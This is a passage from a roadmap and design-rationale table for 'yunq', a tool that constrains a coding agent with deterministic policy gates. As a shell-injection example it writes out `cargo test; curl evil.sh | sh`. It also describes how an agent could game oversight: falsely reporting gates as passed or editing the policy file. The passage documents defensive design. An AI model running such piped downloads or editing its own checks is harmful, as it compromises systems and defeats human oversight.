| Gates are values, not instructions | Surveying the agent-workflow ecosystem (e.g. `theam/claude-dev-kit`, Apache-2.0 — a ~2500-line Claude Code plugin) shows the state of the art enforcing gates by *asking*: "never report a gate as passed without having run it" is a prompt line a model can violate silently. yunq is the one project positioned to make that structurally true, because the judge is a separate deterministic artifact. Learn the pipeline shape from such kits; do not adopt their enforcement architecture. |
| `yunq agent` is a subcommand of the one binary, not a second one | The original plan said "new crate `bin/agent`". Every adapter the in-process gate needs already lives in `bin/cli` (policy loader, provenance ledger, Gherkin index, approvals, persisted breaker, audit log, composed `AnalyzerService`). A separate binary could only reach them by depending on `bin/cli` — which makes `yunq agent run` a different executable than the `yunq` on PATH — or by reimplementing them, which is exactly the drift A2 exists to prevent. |
| `run` has an allowlist *and* rejects shell metacharacters | An allowlist that only inspects the first word is not an allowlist: `cargo test; curl evil.sh \| sh` passes it. This is the one tool whose side effect the policy gate never sees, so it is narrowed twice. |
| A finding's cross-run identity excludes its line number | Line numbers move the moment anything above them changes. Identity by `(file, rule, message)` — counted as a multiset, so a duplicate is still a regression — is what makes "the agent introduced nothing new" mean anything after a real edit. |
| The policy file is itself a protected path | The highest-leverage move for anything optimising to make a write land is editing the rulebook, not the code. |
| Reimplement borrowed designs; do not vendor them | Useful prior art in this space is largely Apache-2.0 while yunq is MIT. Apache's attribution/NOTICE/patent terms travel with copied source; behaviour learned from reading it does not. |
| ROADMAP split from DEVLOG | 1280 lines of session narrative made the plan unfindable. The rationale is worth keeping; it just is not a plan. |

## Sequencing

```
done ──► E4–E5 (gate-gaming)
         C1–C3 (CRAP)
         D1–D2 (boundaries)
         E1    (mutation widen, through yunq-cpd)
         A1–A5 (agent runtime core + PR feedback loop)

now  ──► B1–B4 (swarm)  [unblocked: `yunq agent run` is headless]
         A6    (TUI) — last in A, and nothing depends on it

parallel ─► F (performance)  — continuous, gated in CI
            C4 (run coverage) — startable, C1–C3 shipped
            D3–D4 (I/A + arch view) — startable, D1–D2 shipped
            E1 (further widening: taint → rules-engine) — more matrix entries
            G — opportunistic
```

E4–E5 shipped first, ahead of everything else in their group, because they
are the precondition for the rest: every gate A and B are measured against is
only worth building if the agent cannot quietly edit it. C1–C3 (CRAP) shipped
next — cheapest high-value item, both inputs already existed. D1–D2
(boundaries) shipped next — components fall out of the same directory
topology the workspace already enforces via Cargo, and a violation reuses
every pipeline CRAP's findings already flow through, so the whole feature
added one config table and one cross-file rule.

A1–A5 shipped next, in one pass rather than four, because A2 is the reason
the workstream exists and the other three are only interesting once it holds:
a session loop without the gate is a worse version of every agent already on
the market. A5 came along with them because "done" is not a claim you can
make about a pull request the instant you push it. A6 (TUI) is deliberately
still open — it is the one part of A that buys nothing the swarm needs.

B is now unblocked: `yunq agent run --task` is headless, scriptable and
returns a structured outcome, which is exactly the interface B4's topologies
drive. F is continuous and already gated. D3–D4 (I/A metrics, `yunq arch`
viewer) can start now that D1's component model exists. E1's remaining
widening (taint → rules-engine) is more matrix entries, and `core/agent` is
the obvious next admission to it: it is pure, fast, and the highest-
consequence decision logic added since `core/agent-policy` itself.

## Non-goals

- A general-purpose assistant runtime. No chat channels, no personal-assistant
  surface, no plugin marketplace. yunq edits repositories under a policy.
- An MCP server for enforcement (see G).
- An edition wall. Everything in this roadmap ships in the open repo; the
  hosted layer in `yunq-cloud` is convenience, never a gatekeeper.
- Self-assessment. No turn in which the model grades its own edit. The
  analyzer is the judge, or there is no verdict.
